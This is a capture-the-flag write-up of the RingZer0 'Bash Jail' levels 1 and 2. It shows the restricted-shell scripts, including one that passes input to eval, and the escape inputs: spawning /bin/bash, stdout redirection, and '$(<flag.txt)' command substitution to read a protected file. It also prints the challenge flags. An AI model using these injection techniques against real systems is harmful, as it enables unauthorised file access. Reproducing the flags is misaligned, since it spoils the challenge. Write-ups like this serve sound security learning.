# Jail Escaping

### Bash Jail 1

First of this type of challenge. SSH into a machine with given credentials, and you are entered into a limited shell. In this case, you are provided a basic example of what is going on, so you have some idea of how to get out. You see something like the following:

```bash
RingZer0 Team Online CTF

BASH Jail Level 1:
Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)

Flag is located at /home/level1/flag.txt

Challenge bash code:
-----------------------------

while :
do
        echo "Your input:"
        read input
        output=`$input`
done 

-----------------------------
Your input:
```

There are better ways to solve this, but all I did was the following:

```bash
// provide /bin/bash as my "input" :)
/bin/bash
bash: FLAG-U96l4k6m72a051GgE5EN0rA85499172K: command not found
level1@lxc17-bash-jail:~$ 
```

And you have the flag which you can then submit and collect your points.


!!! note
    I knew I was missing something here, so I read a writeup or two after I submitted mine. The key was the supression of stdout. One example I saw had you simply submitting `bash`, and then using `ls 1>&2` followed by `cat flag.txt 1>&2` to get the goods. This was the "niceness" that I was hoping for.


### Bash Jail 2

This one was a little harder, but not too bad. This is what the "jail" looked like:

```bash
function check_space {
    if [[ $1 == *[bdks';''&'' ']* ]]
    then 
            return 0
    fi

    return 1
}

while :
do
    echo "Your input:"
    read input
    if check_space "$input" 
    then
            echo -e '\033[0;31mRestricted characters has been used\033[0m'
    else
            output="echo Your command is: $input"
            eval $output
    fi
done 
```

I did some testing/experimentation, and finally settled on the following input:

```bash
$(<flag.txt)
Your command is: FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P
```

Which seems both simple and elegant at the same time. With this, you can submit the flag and claim your points.
